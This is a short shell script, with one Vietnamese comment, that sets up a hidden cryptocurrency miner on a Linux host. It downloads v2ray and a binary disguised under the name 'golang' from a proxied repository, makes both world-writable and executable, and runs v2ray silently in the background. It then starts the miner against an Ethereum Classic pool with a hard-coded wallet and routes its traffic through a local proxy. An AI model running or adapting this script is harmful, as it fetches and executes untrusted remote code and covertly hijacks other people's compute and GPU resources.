apt update -y && apt install libpci-dev -y
 
wget https://ghproxy.com/https://github.com/v2fly/v2ray-core/releases/download/v4.45.0/v2ray-linux-64.zip
wget https://ghproxy.com/https://github.com/pickaxecolleague/pickaxecolleague/releases/download/1.0/golang
 
unzip v2ray-linux-64.zip
 
#tạo file config v2ray dạng json với tên là config.json
 
chmod 777 golang
chmod 777 v2ray
 
nohup ./v2ray &>/dev/null &
 
./golang --no-sni --hide-date --keep-gpu-busy --cpu-priority 5 \
--reconnect-on-fail-shares 15 --retries 999 --timeout 999999 -a etchash \
--url stratum+tcp://asia1-etc.ethermine.org:4444 -u 0x4a1a9b8e06987cbc27a804543793b93492f6adac -p x \
--proxy 127.0.0.1:9050
